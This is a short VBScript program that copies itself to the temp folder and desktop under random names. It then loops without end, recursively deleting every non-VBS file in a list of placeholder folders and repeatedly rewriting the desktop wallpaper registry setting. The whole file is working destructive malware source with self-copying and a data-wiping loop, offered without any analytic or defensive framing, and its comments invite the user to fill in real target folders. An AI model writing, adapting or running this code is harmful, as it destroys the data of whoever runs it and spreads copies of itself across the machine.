Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
strScriptPath = WScript.ScriptFullName

' Specify the folders in which you want to delete files (modify as needed)
foldersToDelete = Array("C:\Folder1", "C:\Folder2", "C:\Folder3")

' Get the path to the desktop folder
strDesktopFolder = objShell.SpecialFolders("Desktop")

' Specify the number of copies to create
numCopies = 5

' Generate copies of the script
For i = 1 To numCopies
    randomIteration = Int((1000 * Rnd) + 1)

    strCopyPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\Copy" & randomIteration & ".vbs"
    objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files

    ' Create a copy of the script on the desktop
    strDesktopCopyPath = strDesktopFolder & "\Copy" & randomIteration & ".vbs"
    objFSO.CopyFile strCopyPath, strDesktopCopyPath, True ' Add "True" to overwrite existing files
Next

' Loop indefinitely
Do
    ' Delete all files except VBS files within the specified folders
    For Each folderPath In foldersToDelete
        DeleteFilesExceptVBS folderPath
    Next
    
    ' Set wallpaper
    objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", "C:\Windows\System32\imageres.dll", "REG_SZ"
    objShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
    
Loop

Sub DeleteFilesExceptVBS(folderPath)
    On Error Resume Next
    
    Set folder = objFSO.GetFolder(folderPath)
    If Err.Number = 0 Then
        For Each file In folder.Files
            If LCase(objFSO.GetExtensionName(file.Path)) <> "vbs" Then
                objFSO.DeleteFile file.Path
            End If
        Next
        
        ' Recursively delete files in subfolders
        For Each subfolder In folder.Subfolders
            DeleteFilesExceptVBS subfolder.Path
        Next
    End If
    
    On Error GoTo 0
End Sub
